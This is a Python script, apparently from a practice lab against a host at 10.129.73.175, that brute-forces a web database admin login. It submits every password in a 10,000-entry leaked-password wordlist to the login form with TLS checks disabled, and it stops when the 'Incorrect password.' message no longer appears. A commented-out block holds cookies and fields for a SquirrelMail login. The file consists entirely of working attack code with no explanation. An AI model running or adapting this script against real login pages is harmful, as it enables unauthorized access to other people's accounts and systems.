#!/usr/env/bin python
import requests
from pprint import pprint
'''
cookies = {
	'squirrelmail_language': 'deleted',
	'SQMSESSID': 'r2988l2h6meb7c7nd95u804691',
}

headers = {
	'Connection':'keep-alive',
	'Cache-Control': 'max-age=0',
	'Upgrade-Insecure-Requests': '1',
	...
	'Accept-Language': 'en-US,en ;q=0.9',
}

data = {

	'login_username': 'name',
	'secretkey': 'password',
	'js_autodetect_results': '1',
	'just_logged_in':'1'
	
}

'''
username = 'aaa'

passwords = [ x.strip() for x in open('darkweb2017-top10000.txt').read().split('\n') if x ]
count = 0
for password in passwords:
	print('count', count)
	cookies = {
		'PHPSESSID':'hutt15sl66n537467ldct72277'
	}
	
	headers = {
		'Host': '10.129.73.175',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '54',
		'Origin': 'https://10.129.73.175',
		'Connection': 'close',
		'Referer': 'https://10.129.73.175/db/index.php?action=row_view&table=%27',
	}

	data = {
		'password': password,
		'remember' : 'yes',
		'login' : 'Log+In',
		'proc_login' : 'true',
		
	}
	
	response = requests.post('https://10.129.73.175/db/index.php', headers=headers, cookies=cookies, data=data, verify=False)
	count += 1
	if "Incorrect password." not in response.text:
		print('found password', password)
		exit(0)
